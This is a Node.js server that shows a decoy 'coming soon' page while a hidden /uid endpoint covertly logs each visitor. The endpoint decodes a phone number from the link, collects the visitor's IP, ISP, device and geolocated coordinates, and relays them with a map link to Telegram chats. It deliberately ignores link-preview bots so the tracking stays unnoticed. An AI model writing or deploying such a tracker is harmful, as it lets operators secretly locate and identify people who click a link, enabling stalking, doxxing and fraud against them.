// server.js - optimized
const express = require('express');
const axios = require('axios');
const UAParser = require('ua-parser-js');
const rateLimit = require('express-rate-limit'); // optional but recommended
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Views / static
app.set('view engine', 'ejs');
app.set('views', __dirname + '/views');
app.use(express.static('public'));
app.use(express.json());

// Env config validation
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || '';
const PROXY_URL = process.env.PROXY_URL || '';
const CHAT_IDS = (process.env.CHAT_IDS || '').split(',').map(s => s.trim()).filter(Boolean);
if (!TELEGRAM_TOKEN || !PROXY_URL || CHAT_IDS.length === 0) {
  console.warn('⚠️ Warning: TELEGRAM_TOKEN, PROXY_URL or CHAT_IDS may be missing. Check .env');
}

// Rate limiter (protect /uid)
const uidLimiter = rateLimit({
  windowMs: 60 * 1000, // 1 minute window
  max: 30, // limit each IP to 30 requests per windowMs
  standardHeaders: true,
  legacyHeaders: false
});

// In-memory recent IP map to throttle fast repeat (additional layer)
const recentIPs = new Map();
const RATE_LIMIT_MS = 3000; // treat < 3s as spam
const RECENT_CLEANUP_MS = 60 * 60 * 1000; // cleanup entries older than 1h

function isSpam(ip) {
  const now = Date.now();
  const last = recentIPs.get(ip) || 0;
  recentIPs.set(ip, now);
  return (now - last) < RATE_LIMIT_MS;
}

// Periodic cleanup to avoid memory growth
setInterval(() => {
  const cutoff = Date.now() - RECENT_CLEANUP_MS;
  for (const [ip, ts] of recentIPs.entries()) {
    if (ts < cutoff) recentIPs.delete(ip);
  }
}, RECENT_CLEANUP_MS);

// Helper: parse X-Forwarded-For
function getClientIP(req) {
  const xff = req.headers['x-forwarded-for'];
  if (xff) {
    // XFF may contain comma-separated list
    return xff.split(',')[0].trim();
  }
  // fallback to socket remote
  return req.socket.remoteAddress || '127.0.0.1';
}

// Route: home -> coming soon
app.get('/', (req, res) => {
  res.render('coming_soon', {
    countdownDeadline: new Date('2025-08-28T23:59:59Z').toISOString()
  });
});

// UID endpoint with limiter and handler
app.get('/uid', uidLimiter, async (req, res) => {
  const userAgent = req.headers['user-agent'] || '';
  const ipClientRaw = getClientIP(req);
  const ipClient = ipClientRaw.replace(/^::ffff:/, ''); // handle IPv4-mapped IPv6

  // Bot detection - adjust pattern if you want some previews allowed
  const isBot = /(bot|crawl|spider|facebook|whatsapp|telegram|twitter|zalo|znetwork|preview)/i.test(userAgent);
  if (isBot) {
    console.log('🤖 Bot or preview detected, ignoring. UA:', userAgent);
    return res.status(200).send('<pre>🤖 Bot hoặc hệ thống preview – không xử lý.</pre>');
  }

  // Validate UID param
  const uidRaw = req.query.uid;
  if (!uidRaw) {
    return res.status(400).send('<pre>⛔ Thiếu UID – Không xử lý.</pre>');
  }

  // Throttle per-IP quick repeat
  if (isSpam(ipClient)) {
    console.log('⚠️ Spam IP:', ipClient);
    return res.status(429).send('<pre>⚠️ Truy cập quá nhanh. Vui lòng chờ giây lát.</pre>');
  }

  // Decode UID robustly
  let uid = 'Không có UID';
  try {
    // try decodeURIComponent then base64
    const maybeDecoded = decodeURIComponent(uidRaw);
    uid = Buffer.from(maybeDecoded, 'base64').toString('utf8');
    if (!uid || uid.length === 0) throw new Error('empty after decode');
  } catch (err1) {
    try {
      // fallback: assume raw base64
      uid = Buffer.from(uidRaw, 'base64').toString('utf8');
    } catch (err2) {
      console.warn('⚠️ UID decode failed:', err2.message);
      uid = 'UID không hợp lệ';
    }
  }

  // UA parse
  let phone = 'PC / Laptop';
  try {
    const parser = new UAParser(userAgent);
    const device = parser.getDevice();
    phone = device.model ? `${device.vendor || ''} ${device.model}`.trim() : 'PC / Laptop';
  } catch (e) {
    // ignore
  }

  // Time & port
  const port = req.socket.remotePort;
  const time = new Date().toISOString().replace('T', ' ').split('.')[0];

  // Call ip-api with explicit IP to get real geolocation
  try {
    // Use fields to reduce response size (status, query, isp, country, city, zip, lat, lon, timezone)
    const ipApiUrl = `http://ip-api.com/json/${encodeURIComponent(ipClient)}?fields=status,query,isp,country,city,zip,lat,lon,timezone`;
    const ipInfoRes = await axios.get(ipApiUrl, { timeout: 4000 });
    const ipInfo = ipInfoRes.data || {};
    const { query: ip, isp, country, city, zip, lat, lon, timezone } = ipInfo;

    // Build Telegram message (MarkdownV2 or plain - keep simple)
    const output = [
      '📥 *New Visitor From ZNS*',
      `📞 UID (SĐT): *${uid}*`,
      `🌟 IP: \`${ip || ipClient}\` - port: \`${port}\``,
      `🌐 ISP: *${isp || 'Unknown'}*`,
      `📱 Device: *${phone}*`,
      `📍 Location: ${city || 'Unknown'}, ${country || 'Unknown'} (${zip || '-'})`,
      `📌 Lat/Lon: ${lat != null && lon != null ? `[${lat}, ${lon}](https://maps.google.com/?q=${lat},${lon})` : 'N/A'}`,
      `🕒 Time: ${time} (${timezone || 'UTC'})`
    ].join('\n');

    // Send to Telegram via proxy - send in parallel
    if (PROXY_URL && TELEGRAM_TOKEN && CHAT_IDS.length) {
      await Promise.all(CHAT_IDS.map(chatId => {
        return axios.post(PROXY_URL, {
          token: TELEGRAM_TOKEN,
          chat_id: chatId,
          text: output
        }, { timeout: 5000 });
      }));
      console.log('✅ Sent notifications for UID:', uid);
    } else {
      console.warn('⚠️ Telegram not sent - missing PROXY_URL/TELEGRAM_TOKEN/CHAT_IDS');
    }
  } catch (err) {
    console.error('❌ Error while fetching IP info or sending Telegram:', err.message);
    // continue and still render coming_soon
  }

  // Render coming soon (always return 200 so URL preview works)
  res.status(200).render('coming_soon', {
    countdownDeadline: new Date('2025-08-28T23:59:59Z').toISOString()
  });
});

// Fallback: any other route -> coming soon (must be AFTER all APIs)
app.use((req, res) => {
  res.status(200).render('coming_soon', {
    countdownDeadline: new Date('2025-08-28T23:59:59Z').toISOString()
  });
});

// Start server
app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Server running at http://localhost:${PORT}`);
});
